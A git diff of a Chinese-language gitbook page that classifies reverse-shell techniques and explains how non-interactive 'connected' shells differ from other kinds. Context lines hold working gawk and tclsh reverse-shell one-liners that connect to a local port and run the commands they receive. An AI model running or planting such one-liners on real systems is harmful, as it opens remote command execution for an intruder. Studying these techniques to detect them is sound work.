@@ -61,11 +61,11 @@ awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/8080"; while(42) { do{ printf "shell>" |&
 echo 'set s [socket 127.0.0.1 8080];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;sete"exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; };close $s;' | tclsh
 ```
 
-
+![](../../.gitbook/assets/image%20%28437%29.png)
 
 #### 2、网络是短连接，命令执行是常驻shell模式
 
-![](../../.gitbook/assets/image%20%28442%29.png)
+![](../../.gitbook/assets/image%20%28444%29.png)
 
 client向server发送请求，server将命令内容响应给client,client 获取命令内容，通过管道发送给bash执行，并读取执行结果， 最后通过请求再发给server，完成一个流程。 
 
@@ -78,6 +78,17 @@ client向server发送请求，server将命令内容响应给client,client 获取
 在Metasploit 中，通过 reverse\_http和reverse\_https这两种payload，可以生成。如果大家对其他协议的反弹shell感兴 趣，例如icmp的反弹shell
 
 ### 2、非交互式-连通类
+
+连通类非交互式反弹shell，相对传统，容易被检测到，例如nc 反弹，部分bash手法反弹（bash 不加 -i ）。连通类非交互式反 弹shell 可以和业界常说的交互式反弹shell做对应，既然我这里把它定义为非交互式连通类，说明一下我的判断标准：
+
+* 非交互式反弹shell 与交互式反弹shell的本质区别是非交互式反弹shell没有上 上下文。 
+* 连通类和间断类的区别在于连通类的网络和命令之间的传输通道是实时连通的。
+
+判断是否是交互式，有个简单的判断方式：在反弹shell连接后，输入 history 命令，看是否有输出，如果没有输出，说明是非 交互式的。 
+
+连通类非交互式反弹shell，区别于间断类，网络连接与命令输入输出构成一条连续的通道，其基本结构如下图所示：
+
+![](../../.gitbook/assets/image%20%28441%29.png)
 
 
 
